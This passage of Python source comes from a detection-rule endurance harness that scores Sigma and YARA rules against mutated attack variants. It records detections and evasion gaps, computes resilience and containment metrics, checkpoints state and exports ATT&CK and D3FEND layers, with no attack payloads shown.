        target_counts["approved"] += 1

        try:
            if variant.target_type == "yara":
                detection = self.yara_detector.evaluate(variant)
            else:
                detection = self.sigma_detector.evaluate(variant)
        except Exception as exc:
            self.error_records += 1
            self._emit(
                suite="endurance.sparring",
                kind=KIND_ATTACK_VARIANT,
                probe_id=variant.id,
                target=variant.target_type,
                axis=variant.axis,
                cluster=cluster,
                rule_hash=rule_hash,
                fixture_hash=fixture_hash,
                outcome=OUTCOME_ERROR,
                detail={"mutation": variant.mutation_name, "error": str(exc)},
            )
            raise

        if detection.detected:
            self.true_positives += 1
            target_counts["detected"] += 1
            status_glyph = "[+] DETECTED  "
        else:
            self.evasion_gaps += 1
            target_counts["gaps"] += 1
            self.cluster_counts[cluster] += 1
            status_glyph = "[!] EVASION GAP"

        self._emit(
            suite="endurance.sparring",
            kind=KIND_ATTACK_VARIANT,
            probe_id=variant.id,
            target=variant.target_type,
            axis=variant.axis,
            cluster=cluster,
            rule_hash=rule_hash,
            fixture_hash=fixture_hash,
            outcome=OUTCOME_DETECTED if detection.detected else OUTCOME_EVADED,
            detail={"mutation": variant.mutation_name},
        )

        finding_entry = {
            "variant_id": variant.id,
            "target_type": variant.target_type,
            "mutation_name": variant.mutation_name,
            "detected": detection.detected,
            "cluster": cluster,
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        }
        self.recent_findings.append(finding_entry)
        if len(self.recent_findings) > 20:
            self.recent_findings.pop(0)

        logger.info(
            "    [Probe %05d] %s | %-12s | %s",
            self.total_probes,
            status_glyph,
            variant.axis,
            variant.mutation_name,
        )

    # -------------------------------------------------------------------------
    # Metrics & State Checkpointing
    # -------------------------------------------------------------------------
    @property
    def current_resilience(self) -> Optional[float]:
        """Attack-variant resilience: detected / evaluated attack variants.

        The denominator is attack variants that passed the gate and were
        evaluated (``true_positives + evasion_gaps``); benign observations are
        reported separately and never enter this rate.
        """
        evaluated = self.true_positives + self.evasion_gaps
        if evaluated == 0:
            return None
        return self.true_positives / evaluated

    @property
    def average_dod(self) -> Optional[float]:
        total_runs = self.campaigns_count + self.graph_walks_count
        if total_runs == 0:
            return None
        return (self.campaign_dod_sum + self.graph_dod_sum) / total_runs

    @property
    def containment_rate(self) -> Optional[float]:
        total_runs = self.campaigns_count + self.graph_walks_count
        if total_runs == 0:
            return None
        return (self.campaigns_contained + self.graph_walks_contained) / total_runs

    @property
    def average_mttd(self) -> Optional[float]:
        if self.graph_detected_count == 0:
            return None
        return self.graph_mttd_sum / self.graph_detected_count

    def _safe_write_text(self, path: Path, text: str) -> None:
        """Safely writes text to path with atomic temporary replacement and error resilience."""
        tmp_path = path.with_suffix(f".tmp_{uuid.uuid4().hex[:6]}")
        try:
            tmp_path.write_text(text, encoding="utf-8", newline="\n")
            tmp_path.replace(path)
        except OSError:
            try:
                path.write_text(text, encoding="utf-8", newline="\n")
            except OSError as exc:
                logger.warning("Non-fatal disk write error for %s: %s", path.name, exc)
            finally:
                if tmp_path.exists():
                    try:
                        tmp_path.unlink()
                    except OSError:
                        pass

    def _save_state(self, force: bool = False) -> None:
        """Writes live operational metrics to endurance_state.json and updates boundary files."""
        # Throttle state persistence to once every 5 cycles unless forced
        if not force and (self.total_cycles % 5 != 0):
            return

        now = datetime.datetime.now(datetime.timezone.utc)
        elapsed = (now - self.start_time).total_seconds()

        state = {
            "status": "RUNNING" if self.running and not self.stop_requested else "STOPPED",
            "ledger_complete": not getattr(self, "ledger_degraded", False),
            "ledger_error": getattr(self, "ledger_error", None),
            "start_time": self.start_time.isoformat(),
            "last_heartbeat": now.isoformat(),
            "elapsed_seconds": round(elapsed, 1),
            "total_cycles": self.total_cycles,
            "probes_evaluated": self.total_probes,
            "critic_approved": self.critic_approved,
            "critic_blocked": self.critic_blocked,
            "critic_approval_rate": (
                round(self.gated_approved / (self.gated_approved + self.critic_blocked), 4)
                if (self.gated_approved + self.critic_blocked) > 0
                else None
            ),
            "true_positives": self.true_positives,
            "evasion_gaps": self.evasion_gaps,
            "resilience_rate": round(self.current_resilience, 4) if self.current_resilience is not None else None,
            "campaigns_evaluated": self.campaigns_count,
            "campaign_containment_rate": round(self.containment_rate, 4) if self.containment_rate is not None else None,
            "average_depth_of_defense": round(self.average_dod, 3) if self.average_dod is not None else None,
            "graph_walks_evaluated": self.graph_walks_count,
            "average_mttd_seconds": round(self.average_mttd, 1) if self.average_mttd is not None else None,
            "telemetry_replays_evaluated": self.replay_evals_count,
            "noise_benchmarks_evaluated": self.noise_benchmarks_count,
            "run_id": self.run_id,
            "attack_variants_evaluated": self.true_positives + self.evasion_gaps,
            "attack_variants_detected": self.true_positives,
            "benign_events_evaluated": self.benign_events,
            "benign_false_positives": self.benign_false_positives,
            "unclassified_preserved": self.critic_blocked,
            "error_records_preserved": self.error_records,
            "observation_records": {"file": self._records_relpath(), "count": self._record_writer_count()},
            "cluster_breakdown": self.cluster_counts,
            "current_pattern_suite": self.current_pattern_suite,
            "recent_findings": self.recent_findings[-5:],
            "stop_signal_file": str(self.stop_file),
        }

        try:
            self._safe_write_text(self.state_file, json.dumps(state, indent=2))
        except Exception as exc:
            logger.warning("Could not persist state JSON: %s", exc)

        # Synchronize boundary history files for strategic synthesis
        if force or (self.total_cycles % 10 == 0):
            self._sync_boundary_histories()

    def _sync_boundary_histories(self) -> None:
        """Updates boundary_history_sigma.json and boundary_history_yara.json with cumulative counts.

        The counts are the actual per-target sparring observations recorded in
        ``self.target_probes``. Suites that are not typed per target (campaigns,
        DAG walks, replay sweeps, noise calibration) are deliberately not
        allocated onto either rule — a fixed-ratio split would fabricate
        per-target results rather than report them.
        """
        histories: Dict[str, Dict[str, Any]] = {}
        for target_type, target_rule in (
            ("sigma", "Suspicious Process Spawning From Explorer Run Prompt (ClickFix Pattern)"),
            ("yara", "Suspicious_Active_Content_SVG_Attachment"),
        ):
            counts = self.target_probes.get(
                target_type, {"probes": 0, "approved": 0, "detected": 0, "gaps": 0}
            )
            approved = counts["approved"]
            histories[target_type] = {
                "target_type": target_type,
                "target_rule": target_rule,
                "total_generated": counts["probes"],
                "critic_approved": approved,
                "detected_count": counts["detected"],
                "evaded_count": counts["gaps"],
                "detection_rate_on_approved": round(counts["detected"] / approved, 3) if approved > 0 else None,
                "endurance_mode": True,
            }

        try:
            self._safe_write_text(
                self.results_dir / "boundary_history_sigma.json", json.dumps(histories["sigma"], indent=2)
            )
            self._safe_write_text(
                self.results_dir / "boundary_history_yara.json", json.dumps(histories["yara"], indent=2)
            )
        except Exception as exc:
            logger.warning("Could not sync boundary histories: %s", exc)

    def _save_checkpoint(self) -> None:
        cp_file = self.checkpoints_dir / f"checkpoint_cycle_{self.total_cycles:06d}.json"
        try:
            state_data = self.state_file.read_text(encoding="utf-8")
            cp_file.write_text(state_data, encoding="utf-8", newline="\n")
            logger.info("Saved periodic state checkpoint: %s", cp_file.name)
        except OSError as exc:
            logger.warning("Could not write checkpoint: %s", exc)

    def _update_layers(self) -> None:
        """Refreshes MITRE ATT&CK and D3FEND navigation layers."""
        try:
            self.mitre_exporter.export(out_path=self.results_dir / "layer.json")
            self.d3fend_mapper.export(out_path=self.results_dir / "d3fend_layer.json")
        except Exception as exc:
            logger.warning("Layer export warning: %s", exc)

    def _finish_run(self) -> Dict[str, Any]:
        """Gracefully terminates the endurance run and synthesizes results."""
        self.running = False
        logger.info("=" * 72)
        logger.info("ENDURANCE RUN CONCLUDED — SYNTHESIZING ACCUMULATED RESULTS")
        logger.info("Total Cycles: %d | Probes Evaluated: %d", self.total_cycles, self.total_probes)
        res_str = f"{self.current_resilience * 100:.1f}%" if self.current_resilience is not None else "N/A"
        dod_str = f"{self.average_dod:.2f}" if self.average_dod is not None else "N/A"
        cont_str = f"{self.containment_rate * 100:.1f}%" if self.containment_rate is not None else "N/A"
        logger.info("Resilience Rate: %s | DoD: %s | Containment: %s", res_str, dod_str, cont_str)
        logger.info("=" * 72)

        # Force a final state write so the persisted snapshot reflects the run's
        # closing totals rather than the last throttled interval.
        self._save_state(force=True)
        self._update_layers()

        # Author strategic intelligence cable from accumulated evidence
        try:
            cable_path, stats = self.synthesizer.synthesize()
            logger.info("[+] Published Strategic Intelligence Cable: %s", cable_path)
            logger.info("    - Cable ID: %s", stats["cable_id"])
            logger.info("    - Probes Synthesized: %d", stats["total_evaluations"])
            logger.info("    - Resilience Equilibrium: %.1f%%", stats["resilience_rate"] * 100)
        except Exception as exc:
            logger.error("Could not synthesize strategic cable: %s", exc, exc_info=True)
            cable_path = None
            stats = {}

        if self.httpd:
            try:
                self.httpd.shutdown()
            except Exception:
                pass

        return {
            "total_cycles": self.total_cycles,
            "total_probes": self.total_probes,
            "resilience": self.current_resilience,
            "dod": self.average_dod,
            "containment": self.containment_rate,
            "cable_path": str(cable_path) if cable_path else None,
            "stats": stats,
        }


def main() -> int:
    parser = argparse.ArgumentParser(
        prog="python -m tools.swarm.endurance_runner",
        description="Continuous detection boundary endurance harness",
    )
    parser.add_argument(
        "--pace",
        type=float,
        default=0.4,
        help="Delay in seconds between pattern iterations (default: 0.4s)",
    )
    parser.add_argument(
        "--max-cycles",
        type=int,
        default=None,
        help="Optional maximum cycles to run before stopping",
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Disable local HTTP server for swarm_workbench.html",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8000,
        help="HTTP port for local workbench server (default: 8000)",
    )
    parser.add_argument(
        "--no-resume",
        action="store_true",
        help="Start fresh without resuming prior state from endurance_state.json",
    )
    args = parser.parse_args()

    runner = EnduranceRunner(
        pace_seconds=args.pace,
        serve_workbench=not args.no_server,
        http_port=args.port,
        resume=not args.no_resume,
    )
    runner.run(max_cycles=args.max_cycles)
    return 0


if __name__ == "__main__":
    sys.exit(main())
